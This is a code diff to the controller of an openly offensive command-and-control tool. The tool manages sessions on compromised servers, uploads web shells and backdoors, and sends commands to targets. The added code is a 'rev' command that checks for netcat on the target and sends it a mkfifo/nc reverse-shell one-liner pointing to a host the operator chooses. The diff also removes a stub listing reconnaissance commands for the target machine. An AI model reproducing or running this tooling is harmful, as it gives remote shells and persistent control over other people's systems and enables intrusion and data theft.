@@ -1,7 +1,4 @@
-import os, sys, platform, requests, base64, re, difflib
-import time
-import threading
-
+import os, sys, platform, requests, base64, difflib, readline, time, threading
 from .session import Sessions
 
 GREEN = "\033[92m"
@@ -11,10 +8,11 @@ RED = "\033[1;31m"
 YELLOW = "\033[93m"
 RESET = "\033[0m" 
 TOOL_NAME = "C2"
-TOOL_VERSION = "1.0"
+TOOL_VERSION = "1.1"
 TOOL_AUTHOR = "kaitocoding"
 GITHUB_RAW_URL = "https://raw.githubusercontent.com/kaitolegion/c2/main/assets/controller.py"
 
+readline.set_history_length(100)
 
 class Controller:
 
@@ -100,7 +98,6 @@ class Controller:
         spinner_indices = [0] * len(session_list)
         statuses = [None] * len(session_list)
         threads = []
-        stop_event = threading.Event()
 
         # Function to check status for each session
         def check_status(idx, sid, server):
@@ -264,7 +261,6 @@ class Controller:
                 if resp.get("status") == "uploaded":
                     uploaded_file = resp.get('file')
                     print(f"{GREEN}[+]{RESET} Uploaded {shell_name} to server as {BLUE}{uploaded_file}{RESET}")
-                    print(f"{GREEN}[+]{RESET} Link: {server.rstrip('/')}/{uploaded_file}")
                 else:
                     if resp.get("error"):
                         print(f"{YELLOW}[!]{RESET} Upload failed: {resp['error']}")
@@ -275,26 +271,6 @@ class Controller:
         except Exception as e:
             print(f"{YELLOW}[!]{RESET} Unexpected error during upload: {e}")
 
-    # display target machine relevant system information
-    def display_sys_info(self, session):
-        """
-        Fetch and display system information from the target machine.
-            "echo '[KERNEL]'; uname -a; "
-            "echo '[USER]'; whoami; "
-            "echo '[ID]'; id; "
-            "echo '[HOSTNAME]'; hostname; "
-            "echo '[OS]'; lsb_release -a 2>/dev/null || cat /etc/os-release 2>/dev/null; "
-            "echo '[UPTIME]'; uptime; "
-            "echo '[MEMORY]'; free -h 2>/dev/null || vm_stat 2>/dev/null; "
-            "echo '[DISK]'; df -h; "
-            "echo '[NETWORK]'; ip a 2>/dev/null || ifconfig 2>/dev/null; "
-            "echo '[PROCESSES]'; ps aux --width 40 --sort=-%mem | head -n 5"
-        """
-        try:
-            # Send a command to get system info (e.g., uname -a; whoami; etc.)
-            pass
-        except Exception as e:
-            print(f"{YELLOW}[!]{RESET} Failed to get system information: {e}")
     # send command to the target machine
     def send_cmd(self, session, cmd):
         server = session.get("server")
@@ -322,7 +298,7 @@ class Controller:
         print(f"{GREEN}[+] Commands:{RESET} (only when connected)")
         print(f"{SILVER}[*] spawn shell [name]{RESET} :   {SILVER}Upload your shell (e.g, spawn shell up.php){RESET}")
         print(f"{SILVER}[*] spawn list{RESET}         :   {SILVER}List of available backdoors{RESET}")
-        print(f"{SILVER}[*] info{RESET}               :   {SILVER}System Information{RESET}")
+        print(f"{SILVER}[*] rev [ip] [port]{RESET}    :   {SILVER}Reverse Shell (netcat){RESET}")
         print(f"{SILVER}[*] clear{RESET}              :   {SILVER}Clear commands{RESET}")
         print(f"{SILVER}[*] exit/quit{RESET}          :   {SILVER}Back to home{RESET}")
         print(f"{GREEN}[+] Commands:{RESET} (not connected)")
@@ -337,6 +313,7 @@ class Controller:
         
     # main run the program
     def run(self):
+        self.clear_screen()
         self.banner()
         self.pogix_menu()
         # command for not connected session
@@ -373,10 +350,9 @@ class Controller:
                         sid_to_kill = session_keys[kill_num-1]
                         del sessions[sid_to_kill]
                         Sessions()._save(sessions)
-                        print(f"{YELLOW}[!]{RESET} Session {sid_to_kill} removed.")
                         # Refresh banner after kill
                         if sessions:
-                            self.banner()
+                            print(f"{YELLOW}[!]{RESET} Session {sid_to_kill} removed.")
                         else:
                             print(f"{YELLOW}[!]{RESET} No sessions left. Registering new session...")
                             session = self.reg()
@@ -413,9 +389,6 @@ class Controller:
                                     Sessions()._save(sessions)
                                 print(f"{YELLOW}[!]{RESET} Returning to session selection/home.")
                                 break
-                            elif cmd.lower() in ["info", "information"]:
-                                self.display_sys_info(session)
-                                continue
                             elif cmd.lower() == "clear":
                                 self.clear_screen()
                                 continue
@@ -441,6 +414,36 @@ class Controller:
                                         print(f"  {SILVER}{f}{RESET}")
                                 except Exception as e:
                                     print(f"{YELLOW}[!]{RESET} Could not list files in {files_dir}: {e}")
+                                continue
+                            # implement reverse shell
+                            elif cmd.lower().startswith("rev"):
+                                parts = cmd.strip().split()
+                                if len(parts) == 3:
+                                    ip = parts[1]
+                                    port = parts[2]
+                                    # First, check if netcat exists on the target
+                                    check_nc_cmd = "which nc || command -v nc"
+                                    try:
+                                        self.send_cmd(session, check_nc_cmd)
+                                        nc_path = self.response(session).strip()
+                                        if not nc_path or "not found" in nc_path.lower():
+                                            print(f"{YELLOW}[!]{RESET} Netcat (nc) not found on target. Cannot spawn reverse shell.")
+                                            continue
+                                        rev_cmd = (f"touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f")
+                                        try:
+                                            self.send_cmd(session, rev_cmd)
+                                            response = self.response(session)
+                                            print(f"{GREEN}{response}{RESET}")
+                                        except KeyboardInterrupt:
+                                            print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected during reverse shell. Aborting command.")
+                                            continue
+                                    except KeyboardInterrupt:
+                                        print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected during netcat check. Aborting command.")
+                                        continue
+                                    except Exception as e:
+                                        print(f"{YELLOW}[!]{RESET} Failed to send reverse shell: {e}")
+                                else:
+                                    print(f"{YELLOW}[!]{RESET} Usage: rev [ip] [port]")
                                 continue
                             # Send to target
                             try:
